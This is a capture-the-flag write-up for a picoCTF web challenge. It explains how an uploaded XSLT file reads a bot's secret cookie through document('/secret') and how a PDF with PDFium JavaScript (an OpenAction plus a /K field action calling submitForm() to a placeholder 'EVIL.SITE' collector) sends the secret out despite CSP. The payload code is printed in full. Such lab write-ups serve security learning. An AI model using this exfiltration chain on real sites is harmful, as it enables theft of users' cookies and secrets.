# paper-2 writeup

## TL;DR

The winning chain was:

1. Upload a PDF that uses PDFium JavaScript.
2. Give it an `OpenAction` that copies `this.URL` into a text field.
3. Attach a `/K` action to that field so the write triggers `submitForm()` in a trusted keystroke context.
4. Upload an XML/XSLT wrapper that fetches `/secret` with `document('/secret')`.
5. Use XSLT to build an `<iframe src="/paper/<pdf>?s=<secret>">`.
6. Let the PDF exfiltrate its own URL to a webhook.
7. Parse `s=<secret>` from the posted FDF and redeem `/flag?secret=<secret>`.

This worked remotely and locally on the source-built stack.

## Challenge model

The important parts of the app are simple:

- The bot visits `https://web/paper/:id`.
- It sets a fresh random 32-hex `secret` cookie for that visit.
- `/secret` reflects the cookie into both text and an attribute:

```html
<body secret="SECRET">SECRET
{payload}</body>
```

- All normal pages get:

```text
Content-Security-Policy: default-src 'self' 'unsafe-inline'; script-src 'none'
```

- Managed Chrome policy only allows browsing to `https://web`.

So normal HTML+JS exfil is dead. The challenge is really about finding a browser feature that still has enough power under those constraints.

## What we chased first

We spent a long time on browser-side selector attacks:

- CSS/font-based subgrouping
- PDF multiplicity
- frame counting
- exact CSS prefix pages
- nested `/secret` staging

That work was not wasted. It proved a lot of real primitives:

- PDF `submitForm()` exfil was real.
- Frame counting was real.
- `/secret`-based selectors were real.
- Direct exact CSS pages were real.

But those lines all had a fatal problem in practice: we were trying to **decode** the secret through browser side effects, when the challenge already had a much simpler way to **read** it.

## The big miss: XSLT

The challenge source tells us:

- JavaScript is blocked.
- But uploaded files can be served back as attacker-chosen MIME types.

That means uploaded XML is not “just text”. Chrome will render it as XML, and XML processing instructions still work there.

The key primitive is:

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="#xsl"?>
<root xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:stylesheet xml:id="xsl" version="1.0">
    <xsl:template match="/">
      <html xmlns="http://www.w3.org/1999/xhtml">
        <body>
          <xsl:value-of select="document('/secret')//@secret"/>
        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
</root>
```

That `document('/secret')` call makes a same-origin request with the bot cookie, and `//@secret` extracts the reflected secret from the returned DOM.

Once that worked, the problem was no longer “how do we infer the secret?”. It became “how do we leak a string we already have?”

## The PDF half

We had already found the right exfil sink:

- PDFium JavaScript is alive even though page CSP disables normal JS.
- `this.submitForm(...)` can make a network request to an external collector.

The catch is that PDFium wants `submitForm()` to happen in a trusted event context.

The useful trick was:

1. Put a text field in the PDF.
2. Put the exfil JavaScript in that field’s `/K` action.
3. On document open, programmatically set the field value.
4. PDFium treats that commit as a keystroke-style action and allows the `/K` script to call `submitForm()`.

The final PDF behavior we used was:

- `OpenAction` JS:

```js
this.getField('x').value = this.URL;
```

- field `/K` JS:

```js
this.submitForm({cURL: "https://<EVIL.SITE>/<tag>", bEmpty: true});
```

So the PDF simply leaks its own URL.

## Putting them together

The XSLT wrapper generates:

```html
<iframe src="/paper/<pdf_id>?s=<secret>"></iframe>
```

That means when the PDF opens, `this.URL` includes:

```text
/paper/<pdf_id>?s=<secret>
```

The PDF posts an FDF body to the collector, and that FDF contains the full PDF URL. Parsing out `s=...` gives the secret directly.

At that point:

```text
/flag?secret=<secret>
```

returns the flag.

## Remote result

We verified the solve remotely.

Recovered secret:

```text
2b48399697b773da6005224b27a6a6d4
```

Recovered flag:

```text
picoCTF{i_l1ke_frames_on_my_canvas_XXXXXXXX}
```
